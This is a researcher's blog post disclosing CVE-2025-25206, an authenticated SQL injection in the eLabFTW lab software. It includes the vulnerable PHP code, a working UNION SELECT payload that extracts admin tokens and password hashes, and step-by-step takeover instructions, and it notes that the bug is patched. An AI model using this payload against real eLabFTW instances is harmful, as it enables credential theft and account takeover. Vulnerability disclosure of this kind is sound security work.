---
layout: post
title: "Elabftw CVE-2025-25206"
category: cve
tags: [elabftw, cve-2025-25206, security]
---

## Authenticated SQL Injection via Metadata Update

### Identifying the Vulnerability

[Elabftw](https://github.com/elabftw/elabftw) is an experiment tracking software used by many universities, particularly in Europe it seems. I came across it during a CTF and thought it looked interesting, so I cloned the Github repo and started to dig in.

Prior to going deep into any web assessment, I like to manually look at every query string in an app to ensure that there aren't any irregularities.  Sure this takes time, but often I find that I can catch things that automated scanners miss.

Often times string concatenation is a major culprit for SQL injection, and since this app is written in PHP that syntax would look something like `$sql = "SELECT something from table WHERE id = " . $id`. Knowing this, I did a full regex search through the codebase along the lines of `/SELECT.*\..*/`, basically just looking for string concatenation.

After going through the results, one function in the `Users` model caught my eye

```php
    public function readNamesFromIds(array $idArr): array
    {
        if (empty($idArr)) {
            return array();
        }
        $sql = "SELECT CONCAT(users.firstname, ' ', users.lastname) AS fullname, userid, email FROM users WHERE userid IN (" . implode(',', $idArr) . ') ORDER BY fullname ASC';
        $req = $this->Db->prepare($sql);
        $this->Db->execute($req);

        return $req->fetchAll();
    }
```

As can be seen, this `idArr` field is being concatenated onto the sql string.  


```php
$sql = "SELECT CONCAT(users.firstname, ' ', users.lastname) AS fullname, userid, email 
FROM users WHERE userid IN (" . implode(',', $idArr) . ') ORDER BY fullname ASC';
```

If somehow it weren't sanitized we as an attacker could inject arbitrary SQL and potentially read sensitive data.

Tracing the call stack, I found that `idArr` is passed in by `PermissionsHelper` to see which users have permissions to view an experiment.

```php
   /**
     * Make the permissions json string an array with human readable content, translate the ids
     */
    public function translate(Teams $Teams, TeamGroups $TeamGroups, string $json): array
    {
        $permArr = json_decode($json, true, 512, JSON_THROW_ON_ERROR);
        $result = array();

        $base = BasePermissions::tryFrom($permArr['base']) ?? throw new ImproperActionException('Invalid base parameter for permissions');
        $result['base'] = $base->toHuman();
        $result['teams'] = $Teams->readNamesFromIds($permArr['teams']);
        $result['teamgroups'] = $TeamGroups->readNamesFromIds($permArr['teamgroups']);
        $result['users'] = $Teams->Users->readNamesFromIds($permArr['users']);

        return $result;
    }
```

As can be seen, the `permArr` variable is just decoded JSON, and the `translate` function is just passing in the JSON from the key `users` to the `readNamesFromIds` function. If we as a user can alter the JSON (which is likely because we can update permissions for our experiments), we can execute a full SQL injection. 

Looking at the experiments UI, I saw an option to `changeVisibility` of an experiment. Clicking on it gives me this:

<figure style="text-align: center; margin: 2em 0;">
  <img src="/assets/img/elabftw/visibility.png" alt="Proxy" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
</figure>

After clicking save and proxying the request through Burpsuite, I see the following:

<figure style="text-align: center; margin: 2em 0;">
  <img src="/assets/img/elabftw/visibility_intercepted.png" alt="Proxy" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
</figure>


Perfect. As can be seen, when we update the `visibility` setting we are sending a JSON string with a `users` key, exactly what we need to abuse in order inject SQL.


### Exploiting

Given that we can inject arbitrary SQL, what type of attack should we go for next? Looking through the `MYSQL` config, I saw that the user does not have `FILE` permissions, so writing a reverse shell into the webroot is not an option.

Fortunately, there's a much simpler way to privilege escalation here -- a `UNION SELECT` query.  If we look at the original query,

```
$sql = "SELECT CONCAT(users.firstname, ' ', users.lastname) AS fullname, userid, email FROM users WHERE userid IN (" . implode(',', $idArr) . ') ORDER BY fullname ASC';
```

we can see that it's fetching 3 text columns from the database. Given that most sensitive data (password hashes, tokens) are stored in the text format, we can use that to our advantage.

To escape out of the original SQL string and perform a UNION attack, I went with the following values for `users`:

```
9999999) UNION SELECT email, token, password_hash FROM users WHERE id = 1 OR 1 IN (2
```

While to those unfamiliar with SQLi this may look strange, when concatenated onto the original SQL query we get the following:

```
SELECT CONCAT(users.firstname, ' ', users.lastname) AS fullname, userid, email FROM users WHERE userid IN (9999999) UNION SELECT email, token, password_hash FROM users WHERE id = 1 OR 1 IN (2) ORDER BY fullname ASC
```

This is a perfectly valid SQL query. Note that the `SELECT CONCAT` part is basically ignored whereas the `UNION SELECT` part will always return results. This allows us to get the sysadmin's token and password hash, enabling full takeover of the app.

### PoC

1. Login to elabftw as an unprivileged user.
2. Create an experiment and edit the visibility. 
3. Capture the request in BurpSuite or another proxy. Change the `users` field in the `canread` JSON object to the payload above

    <figure style="text-align: center; margin: 2em 0;">
      <img src="/assets/img/elabftw/sqli.png" alt="Proxy" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
    </figure>

4. Refresh the experiments page. Where the permissions options lives, you should the see the results of the UNION query, which contains a password hash, token, or whatever you're targeting.

    <figure style="text-align: center; margin: 2em 0;">
      <img src="/assets/img/elabftw/sqli_results.png" alt="Proxy" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
    </figure>

5. If targeting admin token, copy the token and replace the existing `token` cookie with that value.  

    <figure style="text-align: center; margin: 2em 0;">
      <img src="/assets/img/elabftw/token.png" alt="Proxy" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
    </figure>

6. Request the `sysconfig.php` page in your browser. You are now logged in as sysadmin with full control over the app.

    <figure style="text-align: center; margin: 2em 0;">
      <img src="/assets/img/elabftw/sysadmin.png" alt="Proxy" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
    </figure>

### Final Thoughts
This app in general is quite strictly audited and pretty well secure. It just goes to show that sometimes simple, obvious mishaps can go under the radar. 

Note that this has been patched and a security advisory has been published here: [GHSA-qffc-rfjh-77gg](https://github.com/elabftw/elabftw/security/advisories/GHSA-qffc-rfjh-77gg)
 
